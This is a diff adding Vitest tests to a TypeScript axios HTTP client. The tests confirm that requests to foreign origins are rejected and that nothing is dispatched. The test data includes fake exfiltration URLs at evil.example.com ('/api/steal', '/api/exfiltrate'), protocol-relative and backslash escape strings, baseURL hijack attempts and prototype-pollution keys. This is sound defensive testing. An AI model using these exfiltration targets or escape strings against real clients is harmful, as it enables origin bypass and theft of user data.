@@ -8,7 +8,7 @@
  * real-API E2E (SPA #17) and are explicitly out of scope.
  */
 
-import { afterEach, describe, expect, it, vi } from "vitest";
+import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import axios from "axios";
 import { http, HttpResponse } from "msw";
 import { server } from "@/test/server";
@@ -21,6 +21,7 @@ import {
 } from "@/test/http-handlers";
 import {
   apiBaseUrlFromEnv,
+  buildHttpError,
   createHttpClient,
   CSRF_COOKIE_NAME,
   CSRF_HEADER_NAME,
@@ -119,6 +120,150 @@ describe("http client configuration", () => {
     );
     expect(axios.defaults.withCredentials).not.toBe(true);
     expect(axios.defaults.headers.common.Authorization).toBeUndefined();
+  });
+});
+
+describe("origin invariant and zero outbound dispatch on foreign targets", () => {
+  let dispatchedUrls: string[] = [];
+  const onRequestStart = ({ request }: { request: Request }) => {
+    dispatchedUrls.push(request.url);
+  };
+
+  beforeEach(() => {
+    dispatchedUrls = [];
+    server.events.on("request:start", onRequestStart);
+  });
+
+  afterEach(() => {
+    server.events.removeListener("request:start", onRequestStart);
+    document.cookie = `${CSRF_COOKIE_NAME}=; Max-Age=0; path=/`;
+  });
+
+  it("rejects foreign absolute URL on GET and records zero outbound requests", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+
+    let cause: unknown;
+    try {
+      await client.instance.get("https://evil.example.com/api/steal");
+    } catch (err) {
+      cause = err;
+    }
+
+    expectKind(cause, "unexpected", null);
+    expect(dispatchedUrls).toHaveLength(0);
+    expect(test.calls).toHaveLength(0);
+  });
+
+  it("rejects foreign absolute URL on POST before CSRF bootstrap and records zero outbound requests", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+    document.cookie = `${CSRF_COOKIE_NAME}=${TEST_CSRF_TOKEN}; Path=/`;
+
+    let cause: unknown;
+    try {
+      await client.instance.post("https://evil.example.com/api/exfiltrate", {
+        data: "sensitive",
+      });
+    } catch (err) {
+      cause = err;
+    }
+
+    expectKind(cause, "unexpected", null);
+    expect(dispatchedUrls).toHaveLength(0);
+    expect(test.calls).toHaveLength(0);
+    expect(JSON.stringify(cause)).not.toContain(TEST_CSRF_TOKEN);
+    expect(JSON.stringify(cause)).not.toContain("evil.example.com");
+  });
+
+  it("rejects protocol-relative escapes and records zero outbound requests", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+
+    const escapes = [
+      "//evil.example.com/escape",
+      "\\\\evil.example.com\\escape",
+      "/\\evil.example.com/escape",
+      "\\/evil.example.com/escape",
+      "/api\\backslash-escape",
+    ];
+
+    for (const escapeUrl of escapes) {
+      dispatchedUrls = [];
+      let cause: unknown;
+      try {
+        await client.instance.get(escapeUrl);
+      } catch (err) {
+        cause = err;
+      }
+      expectKind(cause, "unexpected", null);
+      expect(dispatchedUrls).toHaveLength(0);
+      expect(test.calls).toHaveLength(0);
+    }
+  });
+
+  it("rejects per-request baseURL override to foreign origin and records zero outbound requests", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+
+    let cause: unknown;
+    try {
+      await client.instance.get("/api/v1/test", {
+        baseURL: "https://foreign-override.example.com",
+      });
+    } catch (err) {
+      cause = err;
+    }
+
+    expectKind(cause, "unexpected", null);
+    expect(dispatchedUrls).toHaveLength(0);
+    expect(test.calls).toHaveLength(0);
+  });
+
+  it("rejects foreign target even when allowAbsoluteUrls: true is explicitly passed", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+
+    let cause: unknown;
+    try {
+      await client.instance.get("https://evil.example.com/bypass", {
+        allowAbsoluteUrls: true,
+      });
+    } catch (err) {
+      cause = err;
+    }
+
+    expectKind(cause, "unexpected", null);
+    expect(dispatchedUrls).toHaveLength(0);
+    expect(test.calls).toHaveLength(0);
+  });
+
+  it("rejects requests if instance.defaults.baseURL is mutated to foreign origin", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+
+    client.instance.defaults.baseURL = "https://hijacked.example.com";
+
+    let cause: unknown;
+    try {
+      await client.instance.get("/api/v1/test");
+    } catch (err) {
+      cause = err;
+    }
+
+    expectKind(cause, "unexpected", null);
+    expect(dispatchedUrls).toHaveLength(0);
+    expect(test.calls).toHaveLength(0);
+  });
+
+  it("permits same-origin absolute URLs matching trustedOrigin", async () => {
+    const test = useFreshHandlers();
+    const client = createHttpClient(TEST_API_BASE);
+
+    const res = await client.instance.get(`${TEST_API_BASE}${TEST_ECHO_PATH}`);
+    expect(res.status).toBe(200);
+    expect(test.calls).toHaveLength(1);
+    expect(test.calls[0]?.path).toBe(TEST_ECHO_PATH);
   });
 });
 
@@ -363,6 +508,20 @@ describe("typed error mapping", () => {
     const client = createHttpClient(TEST_API_BASE);
     const cause = await rejectedPost(client);
     expectKind(cause, "unexpected", null);
+
+    // Out-of-bounds status codes map to null
+    expect(
+      buildHttpError({ kind: "unexpected", status: 50 }).status,
+    ).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: 99 }).status,
+    ).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: 600 }).status,
+    ).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: 650 }).status,
+    ).toBeNull();
   });
 
   it("maps network failures with timedOut=false", async () => {
@@ -456,6 +615,12 @@ describe("typed error mapping", () => {
     expect(parseRetryAfterSeconds("-1")).toBeNull();
     expect(parseRetryAfterSeconds("invalid-date")).toBeNull();
     expect(parseRetryAfterSeconds("99999999999999999999999")).toBeNull();
+  });
+
+  it("rejects impossible calendar dates in Retry-After headers", () => {
+    expect(parseRetryAfterSeconds("Sun, 31 Feb 2026 12:00:00 GMT")).toBeNull();
+    expect(parseRetryAfterSeconds("Thu, 31 Apr 2026 12:00:00 GMT")).toBeNull();
+    expect(parseRetryAfterSeconds("Wed, 31 Jun 2026 12:00:00 GMT")).toBeNull();
   });
 
   it("yields null retryAfterSeconds when Retry-After is absent", async () => {
@@ -567,6 +732,15 @@ describe("api base url validation and factory boundary", () => {
     );
   });
 
+  it("rejects backslashes in API base URL", () => {
+    expect(() => resolveApiBaseUrl("http://localhost:8000\\api")).toThrow(
+      InvalidApiBaseUrlError,
+    );
+    expect(() => resolveApiBaseUrl("http://localhost\\path")).toThrow(
+      InvalidApiBaseUrlError,
+    );
+  });
+
   it("resolves apiBaseUrlFromEnv correctly or fails closed", () => {
     expect(apiBaseUrlFromEnv({ VITE_API_URL: "http://localhost:8000" })).toBe(
       "http://localhost:8000",
@@ -673,5 +847,80 @@ describe("type guards and structural variant validation", () => {
 
     expect(isCsrfMismatchHttpError(valid419)).toBe(true);
     expect(isCsrfMismatchHttpError(valid429)).toBe(false);
+  });
+
+  it("buildHttpError fails closed on malformed, primitive, and prototype-polluting inputs", () => {
+    // Malformed and primitive inputs safely default to unexpected
+    expect(isHttpError(buildHttpError(null))).toBe(true);
+    expect(buildHttpError(null).kind).toBe("unexpected");
+    expect(buildHttpError(undefined).kind).toBe("unexpected");
+    expect(buildHttpError("string-input").kind).toBe("unexpected");
+    expect(buildHttpError(12345).kind).toBe("unexpected");
+    expect(buildHttpError(true).kind).toBe("unexpected");
+    expect(buildHttpError([]).kind).toBe("unexpected");
+
+    // Prototype pollution and unknown kind attempts
+    expect(buildHttpError({ kind: "__proto__" }).kind).toBe("unexpected");
+    expect(buildHttpError({ kind: "toString" }).kind).toBe("unexpected");
+    expect(buildHttpError({ kind: "constructor" }).kind).toBe("unexpected");
+    expect(buildHttpError({ kind: "valueOf" }).kind).toBe("unexpected");
+    expect(buildHttpError({ kind: "unknown_random_kind" }).kind).toBe(
+      "unexpected",
+    );
+
+    // Malformed custom payload structures fallback safely
+    const malformedValidation = buildHttpError({
+      kind: "validation",
+      body: "not an object",
+    });
+    expect(malformedValidation.kind).toBe("validation");
+    if (isValidationHttpError(malformedValidation)) {
+      expect(malformedValidation.fieldErrors).toEqual({});
+    }
+
+    const malformedRateLimit = buildHttpError({
+      kind: "rate_limited",
+      retryAfterHeader: { invalid: true },
+    });
+    expect(malformedRateLimit.kind).toBe("rate_limited");
+    if (isRateLimitedHttpError(malformedRateLimit)) {
+      expect(malformedRateLimit.retryAfterSeconds).toBeNull();
+    }
+  });
+
+  it("handles out-of-bounds status codes (< 100 or > 599) in buildHttpError and isHttpError", () => {
+    expect(
+      buildHttpError({ kind: "unexpected", status: 50 }).status,
+    ).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: 99 }).status,
+    ).toBeNull();
+    expect(buildHttpError({ kind: "unexpected", status: 0 }).status).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: -1 }).status,
+    ).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: 600 }).status,
+    ).toBeNull();
+    expect(
+      buildHttpError({ kind: "unexpected", status: 650 }).status,
+    ).toBeNull();
+
+    expect(
+      isHttpError({
+        kind: "unexpected",
+        status: 50,
+        message: "An unexpected response was received.",
+        timedOut: false,
+      }),
+    ).toBe(false);
+    expect(
+      isHttpError({
+        kind: "unexpected",
+        status: 600,
+        message: "An unexpected response was received.",
+        timedOut: false,
+      }),
+    ).toBe(false);
   });
 });
